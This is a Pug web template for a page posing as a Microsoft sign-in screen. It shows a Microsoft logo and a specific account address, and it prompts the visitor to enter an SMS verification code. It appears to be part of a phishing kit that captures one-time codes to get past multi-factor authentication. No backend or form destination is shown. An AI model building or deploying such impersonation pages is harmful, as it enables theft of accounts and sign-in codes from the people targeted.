block variables
    title = "SMS"

extends layout

block content
    .container
        #form.w-100.d-flex.justify-content-center.align-items-center
            form.col-10.shadow-lg.p-4.mb-5.bg-body.rounded
                .d-grid.gap-4
                    .d-flex
                        img(src='../MS%20Logo.jpg', alt='Microsoft Logo', style='height: 2.5rem')
                        h2#microsoft.px-2 Microsoft
                    #example.p michaelbose@nakivo.onmicrosoft.com
                #signin.h2 Enter Code
                p.message
                    img(src='../chat.png',style='height: 1.25rem', alt='Chat Icon')
                    |  We texted your phone +XXX XXXXXXX52.Please Enter the code to sign in
                .form-group
                    label(for='password')
                    input#password(type='', style='margin: 0rem')
                .d-grid.gap-1
                    p(style='margin-top:1rem')
                        | Having trouble?
                        a#option.link-primary(href='#')  Sign in another way?
                    a(href='#', style='margin-bottom:1rem') More Information
                    .d-flex.flex-row.justify-content-end
                        button#login.btn.btn-primary(type='submit', name='login', style='background-color: #0864b4') Verify
                    br
                .row.py-0
                    .col-md-12
                        .form-group
                            h2.py-0.text-center
    script(src='https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/js/bootstrap.min.js')